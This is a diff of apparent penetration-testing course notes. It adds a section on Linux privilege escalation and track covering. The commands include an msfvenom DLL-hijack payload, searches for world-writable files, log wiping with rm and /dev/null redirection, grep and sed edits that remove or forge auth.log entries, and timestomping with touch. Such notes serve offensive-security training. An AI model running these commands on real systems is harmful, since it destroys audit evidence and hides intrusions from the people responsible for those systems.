@@ -617,4 +617,127 @@ Find vulnerable service and the dll thats runwith it. After scp the payload over
   
 	msfvenom -p windows/exec CMD='cmd.exe /C "type C:\Users\Admin\Desktop\flag.txt" > C:\MemoryStatus\flag.txt' -f dll > hijackmeplz.dll
 		scp student@10.50.22.235:/home/student/hijackmeplz.dll . (Run on the target Machine)
-  
+
+
+
+# Linux Priv Esc, Persitence, & Obfuscation
+
+### SUID/GUID
+passwd command
+modifies /etc/shadow file with suid privileges
+
+
+### World-Writable Files and Folder:
+
+	find / -type f -perm /2 -o -type d -perm /2 2>/dev/null  # Search for any file or directory that is writable by the context "other"
+
+  	find / -type f -writable -o -type d -writable 2>/dev/null # Search for any file or directory that is writable by the current user
+ 	/tmp 
+
+### Covering Your Tracks
+Remote Logging
+
+syslog, rsyslog, logs configuration file. 
+
+
+### Plan 
+
+   	Prior, after, before (Know the system!)
+
+        What will happen if I do X (What logging?)
+
+        Checks (Where are things?)
+
+        Hide (File locations, names, times)
+
+    	When do you start covering your tracks?
+
+#### Check init system 
+
+	ps -p1
+ 
+#### Auditing SystemV:
+ausearch: Pulls from audit.log
+
+
+	ausearch -p 22
+	ausearch -m USER_LOGIN -sv no
+	ausearch -ua edwards -ts yesterday -te now -i
+ 
+#### Auditing SystemD:
+SystemD
+
+Utilzes journalctl
+
+	journalctl _TRANSPORT=audit
+	journalctl _TRANSPORT=audit | grep 603
+
+
+### Cleaning The Logs
+
+    Before we start cleaning, save the INODE!
+
+        Affect on the inode of using mv VS cp VS cat
+
+    Know what we are removing (Entry times? IP? Whole file? 
+
+
+Cleaning The Logs (Basic)
+
+Get rid of it
+
+	rm -rf /var/log/...
+
+Clear It
+
+	cat /dev/null > /var/log/...
+	echo > /var/log/..
+
+
+
+
+Cleaning The Logs (Precise)
+
+Always work off a backup!
+
+
+GREP (Remove)
+
+	egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+
+
+SED (Replace)
+
+	cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+
+
+#### Timestomp (Nix)
+
+Easy with Nix vs Windows (Native change of Access & Modify times)
+
+	touch -c -t 201603051015 1.txt   # Explicit
+	touch -r 3.txt 1.txt    # Reference
+
+#### Remote Logging: rsyslog
+Check the config!
+
+    Identify server being shipped to!
+
+    Identify which logs are being shipped
+
+Rsyslog? Need to be thorough!
+
+    New version references multiple files for rules
+
+Rsyslog
+
+    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+
+    Older version only uses /etc/rsyslog.conf
+
+    Find out:
+    	grep "IncludeConfig" /etc/rsyslog.conf
+
+
+
+
